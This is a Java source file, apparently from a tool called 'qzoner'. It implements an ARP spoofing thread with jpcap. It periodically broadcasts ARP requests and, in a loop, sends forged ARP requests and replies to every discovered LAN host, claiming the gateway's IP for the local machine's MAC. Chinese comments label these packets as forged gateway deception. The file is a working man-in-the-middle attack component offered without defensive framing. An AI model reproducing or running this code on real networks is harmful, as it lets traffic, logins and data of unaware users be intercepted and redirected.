package org.jasic.qzoner.core;
import jpcap.packet.ARPPacket;
import org.jasic.qzoner.common.GlobalCaches;
import org.jasic.qzoner.common.Globalvariables;
import org.jasic.qzoner.core.entity.IpMacPair;
import org.jasic.qzoner.util.NetWorkUtil;
import org.jasic.qzoner.util.PacketGener;
import org.jasic.utils.TimeUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.UnknownHostException;
import java.util.*;

import static org.jasic.utils.StringUtils.fieldval2Map;
/**
 * User: Jasic
 * Date: 13-9-16
 */
@SuppressWarnings("unchecked")
public class ArpStrategy extends Thread {

    private static final Logger logger = LoggerFactory.getLogger(ArpStrategy.class);
    private static final String logHeader = "[Arp策略]-";

    private long interval;
    private IpMacPair localIpMacPair;

    public ArpStrategy() {
        String mac = Globalvariables.MAC_LOCAL_ETH_0;
        this.interval = Globalvariables.ARP_STRATEGY_INTERVAL;
        this.localIpMacPair = new IpMacPair(NetWorkUtil.getIpByMac(mac), mac);
        this.localIpMacPair.setSubNet(NetWorkUtil.getSubNetByMac(mac));
    }

    public ArpStrategy(IpMacPair ipMacPair) {
        this.localIpMacPair = ipMacPair;
        this.interval = Globalvariables.ARP_STRATEGY_INTERVAL;
    }

    @Override
    public void run() {

        Timer timer = new Timer(true);
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                // 1、arp广播请求
                try {
                    List bs = brocasStrategy();
                    logger.info(logHeader + bs.toString());
                    if (bs.size() == 0) {
                        logger.info(logHeader + "network configure error, generate none arp brocast packet~");
                        return;
                    }
                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(bs);
                } catch (Exception e) {
                    e.printStackTrace();
                    logger.info(logHeader + e.getMessage());
                }

            }
        }, 0, this.interval * 2);
        while (!isInterrupted()) {
            try {
                // 2、伪造网关请请
                List fqs = fakeReqStrategy();
                // 3、伪造网关响应
                List fps = fakeRepStrategy();

                if (fqs.size() != 0) {
                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(fqs);
                    logger.info(logHeader + "[伪造网关请求]" + fqs.toString());
                    TimeUtil.sleep(2);
                }
                if (fps.size() != 0) {
                    GlobalCaches.IP_MAC_LAN_ARP_REQUEST_QUEUE.put(fps);
                    logger.info(logHeader + "[伪造网关响应]" + fps.toString());
                }
                TimeUtil.sleep(this.interval);
            } catch (Exception e) {
                e.printStackTrace();
                logger.info(logHeader + e.getMessage());
            }
        }
    }

    /**
     * 广播策略请求
     */
    private List<ARPPacket> brocasStrategy() throws UnknownHostException, InterruptedException {
        List<ARPPacket> arpPackets = PacketGener.genBrocastArp(this.localIpMacPair, true);
        return arpPackets;
    }

    /**
     * 指定欺骗请求
     */
    private List<ARPPacket> fakeReqStrategy() throws InterruptedException, UnknownHostException {

        List<ARPPacket> arpPacketList = new ArrayList<ARPPacket>();
        IpMacPair gateWay = Globalvariables.GATE_WAY_IP_MAC_PAIR;
        Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);

        if (gateWay == null || availIpMacs.size() == 0) {
            logger.info(logHeader + "GateWay[" + fieldval2Map(gateWay) + "]" + ",from cache has none connectivity machine ");
            return arpPacketList;
        }
        availIpMacs.remove(gateWay.getIp()); // 移除网关和本机

        // 伪造网关ip-mac对
        IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), this.localIpMacPair.getMac());

        for (IpMacPair ipMacPair : availIpMacs.values()) {
            if (ipMacPair.getMac().equals(this.localIpMacPair.getMac())) continue;// 排除本机
            ARPPacket packet = PacketGener.getArpReqPacket(fakeIpMac, ipMacPair, true);
            arpPacketList.add(packet);
        }
        return arpPacketList;
    }

    /**
     * 指定欺骗响应
     * 因为不使用广播欺骗能减少网络阻塞，和不发送给网关。
     */
    private List<ARPPacket> fakeRepStrategy() throws InterruptedException, UnknownHostException {
        List<ARPPacket> arpPacketList = new ArrayList<ARPPacket>();
        IpMacPair gateWay = Globalvariables.GATE_WAY_IP_MAC_PAIR;
        Map<String, IpMacPair> availIpMacs = new HashMap<String, IpMacPair>(GlobalCaches.IP_MAC_LAN_CONNECTIVITY_CACHE);

        if (gateWay == null || availIpMacs.size() == 0) {
            logger.info(logHeader + "GateWay[" + fieldval2Map(gateWay) + "]" + ",from cache has none connectivity machine ");
            return arpPacketList;
        }
        availIpMacs.remove(gateWay.getIp()); // 移除网关和本机

        // 伪造网关ip-mac对
        IpMacPair fakeIpMac = new IpMacPair(gateWay.getIp(), this.localIpMacPair.getMac());

        for (IpMacPair ipMacPair : availIpMacs.values()) {
            if (ipMacPair.getMac().equals(this.localIpMacPair.getMac())) continue;// 排除本机
            ARPPacket packet = PacketGener.getArpRepPacket(fakeIpMac, ipMacPair, true);
            arpPacketList.add(packet);
        }
        return arpPacketList;
    }
}
